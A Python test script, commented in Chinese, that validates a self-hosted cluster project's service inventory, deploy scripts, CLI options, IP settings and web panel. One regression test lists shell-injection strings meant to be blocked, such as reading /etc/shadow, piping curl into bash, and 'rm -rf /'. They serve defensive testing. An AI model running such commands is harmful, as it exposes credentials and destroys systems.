        if 'dirname' in content:
            log_pass("动态计算路径（使用 dirname）")
        else:
            log_warn("可能使用硬编码路径")
        
        # 检查是否有硬编码路径 (只看代码, 注释中的示例路径/文档不算)
        code = "\n".join(
            ln for ln in content.splitlines() if not ln.lstrip().startswith("#")
        )
        hardcoded_patterns = [
            r'/mnt/sd/edge-01/panel',
            r'/mnt/sd/wk-edge/panel',
            r'/opt/onecloud/panel',
        ]
        has_hardcoded = False
        for pattern in hardcoded_patterns:
            if re.search(pattern, code):
                has_hardcoded = True
                log_fail(f"存在硬编码路径匹配: {pattern}")
        
        if not has_hardcoded:
            log_pass("未发现硬编码路径")
        
        # 检查可移植性
        if 'NODE_NAME=' in content:
            log_pass("有 NODE_NAME 变量")
        
        if 'NODE_NAME:-wk-edge-01' in content:
            log_pass("NODE_NAME 支持默认值")
        
        # 检查 systemd 服务文件生成
        if 'systemd/system' in content:
            log_pass("生成 systemd 服务文件")
        
        if 'ExecStart' in content:
            log_pass("服务有 ExecStart 配置")
        
        if 'WorkingDirectory' in content:
            log_pass("服务有 WorkingDirectory 配置")
    
    except Exception as e:
        log_fail(f"panel/install-service.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试11: 节点服务与 services.yaml 一致性 ============
def _norm_svc(name: str) -> str:
    """服务名归一化

    setup.sh 的 add_service 用下划线 (cups_web), inventory / compose / panel
    用连字符 (cups-web)。比对前统一成连字符, 否则每次都会误报。
    """
    return name.strip().replace("_", "-")


def _parse_nodes_yaml_services() -> Dict[str, set]:
    """inventory/nodes.yaml -> {节点名: 服务集合} (支持行内数组与块列表)"""
    nodes: Dict[str, set] = {}
    cur = None
    section = None
    for line in (INVENTORY_DIR / "nodes.yaml").read_text(encoding="utf-8").splitlines():
        m = re.match(r'^\s*-\s*name:\s*(\S+)', line)
        if m:
            cur = m.group(1)
            nodes[cur] = set()
            section = None
            continue
        if cur is None:
            continue
        m = re.match(r'^\s*services:\s*\[([^\]]*)\]\s*$', line)
        if m:
            nodes[cur] = {x.strip() for x in m.group(1).split(",") if x.strip()}
            section = None
            continue
        if re.match(r'^\s*services:\s*$', line):
            section = "services"
            continue
        m = re.match(r'^\s*-\s*(\S+)\s*$', line)
        if m and section == "services":
            nodes[cur].add(m.group(1))
            continue
        if re.match(r'^\s*[a-z_]+:', line):
            section = None
    return nodes


def _parse_services_yaml() -> Dict[str, dict]:
    """inventory/services.yaml -> {服务名: {node, container, ports, volumes}}"""
    svcs: Dict[str, dict] = {}
    cur = None
    section = None
    text = (INVENTORY_DIR / "services.yaml").read_text(encoding="utf-8")
    for line in text.splitlines():
        m = re.match(r'^  ([A-Za-z0-9_.\-]+):\s*$', line)
        if m:
            cur = m.group(1)
            svcs[cur] = {"node": None, "container": False, "ports": [], "volumes": []}
            section = None
            continue
        if cur is None:
            continue
        m = re.match(r'^    ([a-z_]+):\s*(.*)$', line)
        if m:
            key, val = m.group(1), m.group(2).strip()
            if key in ("ports", "volumes"):
                section = key
            else:
                section = None
                if key == "node":
                    svcs[cur]["node"] = val
                elif key == "container":
                    svcs[cur]["container"] = (val == "true")
            continue
        m = re.match(r'^\s+-\s*(.+)$', line)
        if m and section:
            svcs[cur][section].append(m.group(1).strip().strip("\"'"))
    return svcs


def _parse_compose(path: Path) -> Dict[str, dict]:
    """docker-compose.yml -> {服务名: {ports, volumes, network_mode}}

    只取顶层 services 下的一层结构, 够比对用; 不引第三方 YAML 依赖。
    """
    svcs: Dict[str, dict] = {}
    cur = None
    section = None
    in_services = False
    for line in path.read_text(encoding="utf-8").splitlines():
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        # 只在顶层 services: 段内取值 —— 顶层的 volumes:/networks: 缩进同样是
        # 2 空格, 不区分会把具名卷 (cloudflared-config) 误当成服务
        if not line[0].isspace():
            in_services = line.startswith("services:")
            cur = None
            section = None
            continue
        if not in_services:
            continue
        m = re.match(r'^  ([A-Za-z0-9_.\-]+):\s*$', line)
        if m:
            cur = m.group(1)
            svcs[cur] = {"ports": [], "volumes": [], "network_mode": None}
            section = None
            continue
        if cur is None:
            continue
        m = re.match(r'^    ([a-z_]+):\s*(.*)$', line)
        if m:
            key, val = m.group(1), m.group(2).strip()
            if key in ("ports", "volumes"):
                section = key
            else:
                section = None
                if key == "network_mode":
                    svcs[cur]["network_mode"] = val
            continue
        m = re.match(r'^\s+-\s*(.+)$', line)
        if m and section:
            item = m.group(1).strip().strip("\"'")
            svcs[cur][section].append(item.split(":")[0] if section == "ports" else item)
    return svcs


def _parse_setup_services() -> set:
    """scripts/setup.sh 的 add_service 注册表 (归一化后的服务名)"""
    src = (SCRIPTS_DIR / "setup.sh").read_text(encoding="utf-8")
    return {_norm_svc(m.group(1))
            for m in re.finditer(r'^add_service\s+"([^"]+)"', src, re.M)}


def _parse_panel_services() -> Dict[str, set]:
    """panel/config.json -> {节点名: 服务集合}"""
    with open(PANEL_DIR / "config.json", encoding="utf-8") as f:
        data = json.load(f)
    out = {}
    for node in data.get("nodes", []):
        out[node["name"]] = {s["name"] for s in node.get("services", [])}
    return out


def _expand_brace(s: str):
    """展开 bash 花括号: a/{b,c}/d -> [a/b/d, a/c/d] (支持嵌套)

    没有花括号时按逗号切分 —— 顶层 `x,{a,b},y` 的逗号也要展开,
    否则整串会变成一个"目录名"。
    """
    m = re.search(r'\{([^{}]*)\}', s)
    if not m:
        return [p for p in s.split(",") if p]
    out = []
    for alt in m.group(1).split(","):
        out.extend(_expand_brace(s[:m.start()] + alt + s[m.end():]))
    return out


def test_service_consistency():
    """测试 11: 服务清单五方一致性

    五个数据源描述同一件事 —— 「集群里有哪些服务、在哪个节点、开哪个端口」:
      A. inventory/nodes.yaml        节点 -> 服务列表
      B. inventory/services.yaml     服务 -> 节点/是否容器/端口  (权威)
      C. node-*/docker-compose.yml   compose 实际定义
      D. panel/config.json           面板展示
      E. scripts/setup.sh add_service 统一安装入口
    任一处漂移都会表現成「装不上」或「巡检报容器不存在」, 所以这里用 log_fail。
    """
    print("\n" + "=" * 60)
    print("测试 11: 服务清单五方一致性验证")
    print("=" * 60)

    try:
        A = _parse_nodes_yaml_services()
        B = _parse_services_yaml()
        D = _parse_panel_services()
        E = _parse_setup_services()

        C: Dict[str, set] = {}
        cid: Dict[str, dict] = {}
        for node in A:
            p = PROJECT_ROOT / f"node-{node}" / "docker-compose.yml"
            if not p.exists():
                log_fail(f"节点 {node} 缺少 docker-compose.yml", str(p))
                continue
            cid[node] = _parse_compose(p)
            C[node] = set(cid[node])

        allA = set().union(*A.values()) if A else set()
        allC = set().union(*C.values()) if C else set()
        allD = set().union(*D.values()) if D else set()
        setB = set(B)

        log_info(f"数据源规模: nodes={len(allA)} services.yaml={len(setB)} "
                 f"compose={len(allC)} panel={len(allD)} setup.sh={len(E)}")

        # ---- 1. nodes.yaml 声明的服务必须在 services.yaml 有定义 ----
        missing = {_norm_svc(s) for s in allA} - {_norm_svc(s) for s in setB}
        if not missing:
            log_pass("nodes.yaml 声明的服务都在 services.yaml 有定义")
        else:
            log_fail("nodes.yaml 声明但 services.yaml 未定义", ", ".join(sorted(missing)))

        # ---- 2. services.yaml 的服务必须被所属节点的 nodes.yaml 列出 ----
        bad = []
        for svc, meta in B.items():
            node = meta["node"]
            if node and node in A and _norm_svc(svc) not in {_norm_svc(x) for x in A[node]}:
                bad.append(f"{svc}(应属于 {node})")
        if not bad:
            log_pass("services.yaml 的服务都被所属节点的 nodes.yaml 列出")
        else:
            log_fail("services.yaml 服务未登记到所属节点", ", ".join(sorted(bad)))

        # ---- 3. 容器服务必须在对应节点的 compose 里有定义 ----
        bad = []
        for svc, meta in B.items():
            if not meta["container"]:
                continue
            node = meta["node"]
            if node in C and _norm_svc(svc) not in {_norm_svc(x) for x in C[node]}:
                bad.append(f"{svc}({node})")
        if not bad:
            log_pass("所有容器服务都在对应节点的 compose 有定义")
        else:
            log_fail("容器服务在 compose 中缺失", ", ".join(sorted(bad)))

        # ---- 4. compose 里出现的服务必须能在 services.yaml 找到 ----
        extra = {_norm_svc(s) for s in allC} - {_norm_svc(s) for s in setB}
        if not extra:
            log_pass("compose 未定义 services.yaml 之外的服务")
        else:
            log_fail("compose 存在未登记的服务", ", ".join(sorted(extra)))

        # ---- 5. services.yaml 的服务必须在 setup.sh 有安装入口 ----
        # (磁盘管理项 usb_mount / sd_mount 不是服务, 不参与比对)
        disk_ops = {"usb-mount", "sd-mount"}
        missing = {_norm_svc(s) for s in setB} - E - disk_ops
        if not missing:
            log_pass("services.yaml 的服务都能在 setup.sh 里安装")
        else:
            log_fail("services.yaml 有服务在 setup.sh 里没有安装入口",
                     ", ".join(sorted(missing)))

        # ---- 6. panel 与 services.yaml 双向一致 ----
        miss_panel = {_norm_svc(s) for s in setB} - {_norm_svc(s) for s in allD}
        extra_panel = {_norm_svc(s) for s in allD} - {_norm_svc(s) for s in setB}
        if not miss_panel and not extra_panel:
            log_pass("panel/config.json 与 services.yaml 服务集合一致")
        else:
            log_fail("panel 与 services.yaml 服务集合不一致",
                     f"panel 缺: {sorted(miss_panel)}; panel 多: {sorted(extra_panel)}")

        # panel 里的服务必须挂在正确节点下
        bad = []
        for node, svcs in D.items():
            for svc in svcs:
                meta = B.get(svc) or B.get(_norm_svc(svc).replace("-", "_"))
                if meta and meta["node"] and meta["node"] != node:
                    bad.append(f"{svc} 在 panel 里挂到 {node}, services.yaml 里属于 {meta['node']}")
        if not bad:
            log_pass("panel 各服务的归属节点与 services.yaml 一致")
        else:
            log_fail("panel 服务归属节点不一致", "; ".join(sorted(bad)))

        # ---- 7. 端口: services.yaml 与 compose 的宿主端口必须一致 ----
        bad = []
        checked = 0
        for svc, meta in B.items():
            node = meta["node"]
            comp = (cid.get(node) or {}).get(svc)
            if comp is None:
                continue
            if not meta["ports"] and not comp["ports"]:
                continue
            if comp["network_mode"] == "host":
                continue  # host 网络不走 ports 映射, 由 firewall-recommend 单独处理
            # 变量端口 (如 ${MEMOS_PORT}) 的值在 .env 里, 静态比对无意义 ——
            # firewall-recommend.sh 会把它单列成「需人工确认」
            if any("${" in str(p) for p in meta["ports"]) or \
               any("${" in str(p) for p in comp["ports"]):
                log_info(f"  {svc}: 端口含变量引用, 跳过静态比对")
                continue
            y = sorted(str(p).split(":")[0] for p in meta["ports"])
            c = sorted(str(p).split(":")[0] for p in comp["ports"])
            checked += 1
            if y != c:
                bad.append(f"{svc}: services.yaml={y} compose={c}")
        if not bad:
            log_pass(f"容器服务宿主端口 services.yaml 与 compose 一致 (校验 {checked} 个)")
        else:
            log_fail("宿主端口两处不一致", "; ".join(sorted(bad)))

        # ---- 8. deploy.sh 远程预建目录必须覆盖 compose 的相对挂载 ----
        # 目录清单现在是**运行时按 service_installed 过滤后拼出来的**, 不再是
        # 一条写死的 `mkdir -p ${REMOTE_BASE}/{a,b,c}` 字面量 —— 所以这里改成
        # 「静态求值」: 逐个节点把 case 分支里的 item 收集起来, 拼成同一个
        # 括号展开串, 再让 _expand_brace 展开。这样既保留了「deploy 覆盖
        # compose 挂载」的保证, 又不会因为改成动态生成而失效。
        dep = (SCRIPTS_DIR / "deploy.sh").read_text(encoding="utf-8")
        prebuilt = set()
        if "mkdir -p ${dirs}" in dep:
            # 抽取 case 分支: <服务>) item="<目录模板>" ;;
            for svc_pat, item in re.findall(
                    r'^\s*([a-z0-9_|*-]+)\)\s+item="([^"]+)"\s*;;', dep, re.M):
                for one in svc_pat.split("|"):
                    if one in ("*", "\\*"):
                        continue
                    prebuilt |= set(_expand_brace(item))
            # 单服务/无子目录分支 (*) item="$s") -> 服务名自身即目录
            if re.search(r'^\s*\*\)\s+item="\$s"\s*;;', dep, re.M):
                for node, svcs in cid.items():
                    for name in svcs:
                        prebuilt.add(name)
        else:
            m = re.search(r'mkdir -p \$\{REMOTE_BASE\}/\{(.*)\}"\s*$', dep, re.M)
            prebuilt = set(_expand_brace(m.group(1))) if m else set()
            if not m:
                log_fail("deploy.sh 未找到远程目录预建语句")
        if prebuilt:
            need = {}
            for node, svcs in cid.items():
                for name, meta_c in svcs.items():
                    for v in meta_c["volumes"]:
                        if v.startswith("./"):
                            # ./memos/data:/var/opt/memos -> memos/data
                            need.setdefault(v[2:].split(":")[0], []).append(f"{node}:{name}")
            miss = [p for p in need
                    if not any(p == d or p.startswith(d + "/") for d in prebuilt)]
            if not miss:
                log_pass(f"deploy.sh 预建目录覆盖 compose 全部相对挂载 ({len(need)} 个)")
            else:
                log_fail("deploy.sh 未预建的挂载目录",
                         "; ".join(f"{p} <- {','.join(need[p])}" for p in sorted(miss)))

    except Exception as e:
        log_fail(f"服务一致性验证错误: {str(e)}")
        return False

    return True

# ============ 测试12: 生成测试报告 ============
def generate_report():
    """生成测试报告"""
    print("\n" + "="*60)
    print("测试报告")
    print("="*60)
    
    total = PASSED + FAILED + WARNINGS
    
    print(f"\n  总计: {total} 项")
    print(color(f"  通过: {PASSED}", GREEN))
    print(color(f"  失败: {FAILED}", RED))
    print(color(f"  警告: {WARNINGS}", YELLOW))
    
    if FAILED == 0:
        print(f"\n  {color('[OK] 所有关键测试通过！', GREEN)}")
    else:
        print(f"\n  {color(f'[FAIL] 有 {FAILED} 项测试失败，需要修复', RED)}")
    
    # 显示所有警告
    warnings = [(name, detail) for status, name, detail in TEST_RESULTS if status == "WARN"]
    if warnings:
        print(f"\n  警告列表 ({len(warnings)} 项):")
        for name, detail in warnings:
            print(f"    - {name}")
            if detail:
                print(f"      {detail}")
    
    # 显示所有失败
    failures = [(name, detail) for status, name, detail in TEST_RESULTS if status == "FAIL"]
    if failures:
        print(f"\n  失败列表 ({len(failures)} 项):")
        for name, detail in failures:
            print(f"    - {name}")
            if detail:
                print(f"      {detail}")
    
    # 保存报告
    report_file = PROJECT_ROOT / "test_report.txt"
    with open(report_file, "w", encoding="utf-8") as f:
        f.write("OneCloud Cluster 验证报告\n")
        f.write("=" * 60 + "\n")
        f.write(f"通过: {PASSED}\n")
        f.write(f"失败: {FAILED}\n")
        f.write(f"警告: {WARNINGS}\n")
        f.write(f"总计: {total}\n\n")
        
        f.write("详细结果:\n")
        f.write("-" * 60 + "\n")
        for status, name, detail in TEST_RESULTS:
            f.write(f"[{status}] {name}")
            if detail:
                f.write(f" - {detail}")
            f.write("\n")
    
    log_info(f"报告已保存到: {report_file}")
    
    return FAILED == 0

# ============ 测试12: 文档化 CLI 接口契约验证 ============
def test_cli_contract():
    """验证 README / 运维手册中记载的命令行接口确实被实现

    之前的验证只检查语法和字符串存在性, 导致"文档写了但脚本没实现"
    的问题无法被发现 (例如 deploy.sh --exec、wireguard-setup.sh add peer)。
    本测试专门守住这些契约。
    """
    print("\n" + "="*60)
    print("测试 12: 文档化 CLI 接口契约验证")
    print("="*60)

    def read(path):
        p = Path(path)
        return p.read_text(encoding="utf-8", errors="ignore") if p.exists() else ""

    # ---- bootstrap.sh: --node/--ip/--hostname/--sd/--yes ----
    boot = read(SCRIPTS_DIR / "bootstrap.sh")
    for opt in ("--node", "--ip", "--hostname", "--sd", "--yes"):
        if re.search(rf'^\s*-[a-zA-Z\|]*{re.escape(opt.lstrip("-")[0])}\|--?{re.escape(opt.lstrip("-"))}\b', boot, re.M) or opt in boot:
            log_pass(f"bootstrap.sh 支持 {opt}")
        else:
            log_fail(f"bootstrap.sh 缺少 {opt}", "README 记载的初始化用法会失效")

    # ---- deploy.sh ----
    dep = read(SCRIPTS_DIR / "deploy.sh")
    for opt in ("--exec", "--node", "--test", "--dry-run"):
        if opt in dep:
            log_pass(f"deploy.sh 支持 {opt}")
        else:
            log_fail(f"deploy.sh 缺少 {opt}", f"README 记载的 {opt} 会报'未知选项'")

    # -n 必须按节点表查找, 而不是把参数直接当 NAME|IP|ROLE 记录解析
    if "node_selected" in dep:
        log_pass("deploy.sh -n 按节点表解析节点名")
    else:
        log_fail("deploy.sh -n 未做节点名映射", "-n wk-edge-01 会解析出空 IP")

    # ---- wireguard-setup.sh ----
    wg = read(SCRIPTS_DIR / "wireguard-setup.sh")
    if "cmd_add_peer" in wg and re.search(r'^\s*peer\)', wg, re.M):
        log_pass("wireguard-setup.sh 实现 'add peer' 子命令")
    else:
        log_fail("wireguard-setup.sh 缺少 'add peer'", "运维手册 5.2 的用法不可用")
    if re.search(r'^\s*list\|ls\)', wg, re.M):
        log_pass("wireguard-setup.sh 实现 'list' 子命令")
    else:
        log_fail("wireguard-setup.sh 缺少 'list'")
    # 产物必须落到 deploy.sh 能分发的 node-<name>/wireguard/
    if "node-${name}/wireguard/wg0.conf" in wg:
        log_pass("wireguard-setup.sh 输出到 node-<name>/wireguard/wg0.conf")
    else:
        log_fail("wireguard-setup.sh 输出目录与 deploy.sh 分发路径不一致")

    # ---- restore.sh: 支持 <备份ID> <节点名或服务名> 简写 ----
    rst = read(SCRIPTS_DIR / "restore.sh")
    if "RESTORE_TARGET" in rst and "无法识别的恢复目标" in rst:
        log_pass("restore.sh 支持 <备份ID> <目标> 简写形式")
    else:
        log_fail("restore.sh 不支持简写形式", "运维手册 3.3 的用法会落到 usage")
    if "normalize_node" in rst:
        log_pass("restore.sh 支持节点简写 (edge-01 -> wk-edge-01)")
    else:
        log_fail("restore.sh 未做节点名归一化")

    # ---- update-all.sh: 必须过滤 apt list 的 "Listing..." 表头 ----
    upd = read(SCRIPTS_DIR / "update-all.sh")
    if "upgradable from" in upd and ("awk -F'/'" in upd or "NF>1" in upd):
        log_pass("update-all.sh 过滤 apt list 表头")
    else:
        log_fail("update-all.sh 会把 'Listing... Done' 当包名传给 apt upgrade")

    # ---- install-services.sh: PEP 668 兼容 ----
    ins = read(SCRIPTS_DIR / "install-services.sh")
    if "--break-system-packages" in ins:
        log_pass("install-services.sh 兼容 PEP 668 (externally-managed)")
    else:
        log_fail("install-services.sh 在 Debian 12+ 上 pip3 安装会失败")

    # ---- generate-keys.sh: PostUp/PostDown 各只能有一条 ----
    gk = read(NODE_DIRS["wk-edge-01"] / "wireguard" / "generate-keys.sh")
    n_up = len([l for l in gk.splitlines() if l.strip().startswith("PostUp")])
    n_down = len([l for l in gk.splitlines() if l.strip().startswith("PostDown")])
    if n_up <= 1 and n_down <= 1:
        log_pass(f"generate-keys.sh PostUp/PostDown 各 {n_up}/{n_down} 条 (无覆盖)")
    else:
        log_fail(
            f"generate-keys.sh PostUp/PostDown 重复 ({n_up}/{n_down})",
            "wg-quick 只保留最后一条, NAT 规则会被静默丢弃"
        )

    # ---- services.yaml: 不得同时声明 ports 与 network_mode: host ----
    svc_text = read(INVENTORY_DIR / "services.yaml")
    blocks = re.split(r'\n(?=  [a-z0-9_-]+:\s*$)', svc_text)
    conflict_found = False
    for b in blocks:
        m = re.match(r'\s{2}([a-z0-9_-]+):', b)
        if not m:
            continue
        name = m.group(1)
        has_ports = re.search(r'^\s{4}ports:\s*$', b, re.M) is not None
        has_host = re.search(r'^\s{4}network_mode:\s*host\s*$', b, re.M) is not None
        if has_ports and has_host:
            log_fail(f"services.yaml: {name} 同时声明 ports 与 network_mode: host", "docker compose 会拒绝")
            conflict_found = True
    if not conflict_found:
        log_pass("services.yaml 无 ports/network_mode 冲突")

    log_info("CLI 契约检查完成")


# ============ 测试13: 节点 IP 可自定义 / 主机名齐全 ============
def test_ip_customizable():
    """验证: 节点 IP 全部来自清单 (可自定义), 每个节点都有 hostname, 脚本无硬编码旧文档 IP"""
    print("\n" + "="*60)
    print("测试 13: 节点 IP 自定义与主机名完整性")
    print("="*60)

    # 1) 每个节点必须有 hostname (带默认值) 与 ip
    try:
        with open(INVENTORY_DIR / "nodes.yaml", encoding='utf-8') as f:
            nodes_data = simple_yaml_parse(f.read())
        nodes = nodes_data.get("nodes", [])
        if not nodes:
            log_fail("nodes.yaml 未解析出节点")
        for node in nodes:
            name = node.get("name", "?")
            if not node.get("hostname"):
                log_fail(f"节点 {name} 缺少 hostname 字段 (每个节点都必须设定 hostname)")
            else:
                log_pass(f"节点 {name} 主机名: {node['hostname']} (可自定义)")
            if not node.get("ip"):
                log_fail(f"节点 {name} 缺少 ip 字段")
            else:
                log_pass(f"节点 {name} IP: {node['ip']} (来自清单, 可覆盖)")
    except Exception as e:
        log_fail(f"解析 nodes.yaml 失败: {str(e)}")

    # 2) 核心功能脚本不得硬编码旧文档里的 192.168.1.10x / 10.8.0.10x
    core_scripts = [
        "deploy.sh", "update-all.sh", "health-check.sh", "backup.sh",
        "restore.sh", "bootstrap.sh", "setup.sh", "install-services.sh",
        "wireguard-setup.sh",
    ]
    import subprocess
    for script in core_scripts:
        path = SCRIPTS_DIR / script
        if not path.exists():
            continue
        content = path.read_text(encoding='utf-8')
        # 去掉注释行后再查 (避免 help/示例注释误报)
        code_lines = [
            ln for ln in content.splitlines()
            if not ln.strip().startswith("#")
        ]
        code = "\n".join(code_lines)
        hits = re.findall(r'(?:192\.168\.1\.10[0-9]|10\.8\.0\.10[0-9])', code)
        if hits:
            log_fail(f"{script} 仍硬编码旧 IP: {sorted(set(hits))}",
                     "节点 IP 应从 inventory/nodes.yaml 读取, 以支持自定义网络")
        else:
            log_pass(f"{script} 无硬编码节点 IP (IP 全部来自清单)")

    # 4) 节点 .env 生成器可用 (把自定义 IP 贯通到容器运行时)
    if (SCRIPTS_DIR / "gen-node-env.sh").exists():
        r = subprocess.run(["bash", str(SCRIPTS_DIR / "gen-node-env.sh"), "--dry-run"],
                           capture_output=True, text=True, cwd=str(PROJECT_ROOT))
        if r.returncode == 0 and "NODE_IP=" in r.stdout:
            log_pass("gen-node-env.sh 可渲染节点 .env (自定义 IP 贯通到容器)")
        else:
            log_fail("gen-node-env.sh 渲染失败", r.stderr[:120])
    else:
        log_fail("缺少 scripts/gen-node-env.sh")


def test_safety_regression():
    """测试 14: 安全与健壮性回归 (已修缺陷不得复现)"""
    print("\n" + "="*60)
    print("测试 14: 安全与健壮性回归")
    print("="*60)

    # 1) restore.sh: 'latest' 且无备份时必须报错, 不能退化成备份根目录
    restore = SCRIPTS_DIR / "restore.sh"
    if restore.exists():
        src = restore.read_text(encoding="utf-8")
        if 'BACKUP_ID" = "latest"' in src and "没有可用备份" in src:
            log_pass("restore.sh 对 latest 无备份场景有守卫")
        else:
            log_fail("restore.sh 缺少 latest 空备份守卫",
                     "否则 BACKUP_PATH 会退化成备份根目录, 误恢复整个备份目录")

    # 2) 原生安装器: 下载产物须校验 + root 检查
    inst = SCRIPTS_DIR / "install-services.sh"
    if inst.exists():
        src = inst.read_text(encoding="utf-8")
        if "is_elf_binary" in src:
            log_pass("install-services.sh 校验下载产物为可执行文件")
        else:
            log_fail("install-services.sh 未校验下载产物", "404 页面可能被当成安装成功")
        if "require_root" in src:
            log_pass("install-services.sh 对原生安装有 root 权限检查")
        else:
            log_fail("install-services.sh 缺少 root 权限检查")

    # 3) setup.sh: 二进制下载同样需要校验
    setup = SCRIPTS_DIR / "setup.sh"
    if setup.exists():
        src = setup.read_text(encoding="utf-8")
        if "is_elf_binary" in src:
            log_pass("setup.sh 校验二进制下载产物")
        else:
            log_fail("setup.sh 未校验二进制下载产物")

    # 4) 节点内重复安装器应委派到统一脚本, 不得各自实现
    dup = {
        "node-wk-edge-01/clash/install-binary.sh": "mihomo",
        "node-wk-iot-02/xiaomusic/install.sh": "xiaomusic",
    }
    for rel, target in dup.items():
        p = PROJECT_ROOT / rel
        if not p.exists():
            continue
        src = p.read_text(encoding="utf-8")
        if "install-services.sh" in src and target in src:
            log_pass(f"{rel} 已委派统一安装脚本 (无重复实现)")
        else:
            log_fail(f"{rel} 仍在重复实现安装逻辑", "易与 install-services.sh 产生行为分叉")

    # 5) 面板命令白名单: 必须拦住 shell 元字符 (前缀匹配可被 'cmd; evil' 绕过)
    app = PANEL_DIR / "app.py"
    if app.exists():
        try:
            src = app.read_text(encoding="utf-8")
            seg = src[src.index("ALLOWED_CMD_PREFIXES"):src.index("def load_config")]
            ns = {}
            exec(seg, ns)
            safe = ns["is_command_safe"]
            must_pass = ["free -h", "df -h", "docker ps", "uptime", "cat /proc/loadavg"]
            must_block = ["free; cat /etc/shadow", "uptime && curl http://x|bash",
                          "ls `whoami`", "date $(id)", "rm -rf /"]
            bad = [c for c in must_pass if not safe(c)] + [c for c in must_block if safe(c)]
            if not bad:
                log_pass("面板命令白名单: 正常命令放行, 元字符与危险命令被拦截")
            else:
                log_fail(f"面板命令白名单判定异常: {bad}")
        except Exception as e:
            log_fail(f"面板白名单校验失败: {e}")


def test_panel_frontend_contract():
    """测试 15: 面板前端与后端契约 (前端调用必须真实存在, 且方法/参数匹配)"""
    print("\n" + "="*60)
    print("测试 15: 面板前端与后端契约")
    print("="*60)

    js = PANEL_DIR / "static" / "js" / "app.js"
    app = PANEL_DIR / "app.py"
    if not js.exists() or not app.exists():
        log_fail("面板前端或后端文件缺失")
        return

    js_src = js.read_text(encoding="utf-8")
    py_src = app.read_text(encoding="utf-8")

    # 1) 前端引用的 API 端点必须在后端有定义
    endpoints = sorted(set(re.findall(r'fetch\(\s*[`"\'](/api/[a-zA-Z_/]*)', js_src)))
    missing = [ep for ep in endpoints if ep.rstrip("/") not in py_src]
    if missing:
        log_fail(f"前端调用了后端不存在的接口: {missing}")
    else:
        log_pass(f"前端引用的 {len(endpoints)} 个 API 端点后端均已定义")

    # 2) 服务操作必须是 POST (后端 methods=["POST"], 用 GET 会 405)
    sidx = js_src.find("async function serviceAction")
    sbody = js_src[sidx:js_src.find("async function nodeAction")] if sidx >= 0 else ""
    if 'method: "POST"' in sbody:
        log_pass('serviceAction 使用 POST (与后端 methods=["POST"] 匹配)')
    else:
        log_fail("serviceAction 未使用 POST", "后端只接受 POST, 否则启停/重启/日志全部 405")

    # 3) 集群 docker_* 操作必须真正下发请求, 不能只弹提示
    cidx = js_src.find("async function clusterAction")
    cbody = js_src[cidx:js_src.find("async function execCmd")] if cidx >= 0 else ""
    # 判据要松紧适度: 早期实现只弹提示 (无 fetch), 现在是逐个节点真实 POST。
    # 不写死 `JSON.stringify({action})` —— 实际代码带 confirm: true 更安全,
    # 精确匹配字面量会把这种改进误判成失败。
    if "/api/node/" in cbody and "method: \"POST\"" in cbody and \
       re.search(r"JSON\.stringify\(\{[^}]*\baction\b", cbody):
        log_pass("集群 docker_up/down/pull 会对各节点真实下发请求")
    else:
        log_fail("集群批量操作只弹提示未调用 API", "按钮点了没有任何实际效果")

    # 4) 日志操作必须把内容展示出来, 而不是只提示成功
    if '"logs"' in sbody and "execOutput" in sbody:
        log_pass("服务日志操作会输出日志内容 (而非只提示成功)")
    else:
        log_fail("日志操作未展示输出", "点击日志按钮看不到任何内容")

    # 5) 白名单必须允许裸 ls (曾写成 'ls ' 带尾空格, 导致 ls 被拒)
    try:
        seg = py_src[py_src.index("ALLOWED_CMD_PREFIXES"):py_src.index("def load_config")]
        ns = {}
        exec(seg, ns)
        safe = ns["is_command_safe"]
        if safe("ls") and safe("ls /mnt/sd") and not safe("ls && rm -rf /"):
            log_pass("命令白名单允许裸 ls 且仍拦截拼接命令")
        else:
            log_fail("白名单对 ls 的判定不符合预期")
    except Exception as e:
        log_fail(f"白名单 ls 校验失败: {e}")


def test_bootstrap_network_resolution():
    """测试 16: bootstrap 网络取值 (IP/网关联动 + 本机探测 + 来源标注)"""
    print("\n" + "=" * 60)
    print("测试 16: bootstrap 网络取值与网关联动")
    print("=" * 60)

    boot = PROJECT_ROOT / "scripts" / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")

    def run_boot(args, env_extra=None):
        env = dict(os.environ)
        env["ONECLOUD_BOOTSTRAP_TTY"] = "0"   # 强制非交互, 避免测试环境差异
        if env_extra:
            env.update(env_extra)
        return subprocess.run(
            ["bash", str(boot)] + args,
            capture_output=True, text=True, encoding="utf-8",
            errors="replace", env=env, cwd=str(boot.parent),
            stdin=subprocess.DEVNULL,
        )

    def parse_net(out):
        ip_m = re.search(r"静态IP:\s+(\S+)\s+\(来源:\s*([^)]+)\)", out)
        gw_m = re.search(r"网关:\s+(\S+)\s+\(来源:\s*([^)]+)\)", out)
        return (ip_m.groups() if ip_m else None, gw_m.groups() if gw_m else None)

    # 1) 网段推导函数: 由 IP+前缀 得到 "<网络地址> <网关>"
    cases = [("192.168.6.101", "24", "192.168.6.0 192.168.6.1"),
             ("10.0.0.5", "8", "10.0.0.0 10.0.0.1"),
             ("172.16.5.9", "16", "172.16.0.0 172.16.0.1")]
    bad = []
    for ip, prefix, expect in cases:
        r = subprocess.run(
            ["bash", "-c",
             'source <(sed -n "/^ip_net_info()/,/^}/p" "$1"); ip_net_info ' + ip + " " + prefix,
             "_", str(boot)],
            capture_output=True, text=True, encoding="utf-8", errors="replace")
        if r.stdout.strip() != expect:
            bad.append(f"{ip}/{prefix} -> {r.stdout.strip()!r}")
    if bad:
        log_fail(f"网段推导结果错误: {'; '.join(bad)}")
    else:
        log_pass("网段推导函数正确 (/24 /8 /16 均得到网络地址+1 的网关)")

    # 2) 传 --ip 换网段: 网关必须跟着变, 不能停留在清单默认值
    r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.6.101",
                  "--hostname", "edge-01", "--dry-run"])
    (ip_val, ip_src), (gw_val, gw_src) = parse_net(r.stdout)
    if gw_val == "192.168.6.1" and "推导" in (gw_src or ""):
        log_pass("--ip 换网段后网关自动跟随 (192.168.1.1 -> 192.168.6.1)")
    else:
        log_fail(f"--ip 换网段后网关未跟随: 网关={gw_val} 来源={gw_src}",
                 "换网段后网关仍是清单默认值会导致配置完无法联网")

    # 3) 显式 --gateway 不被推导覆盖
    r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.6.101",
                  "--gateway", "192.168.6.254", "--dry-run"])
    _, (gw_val, gw_src) = parse_net(r.stdout)
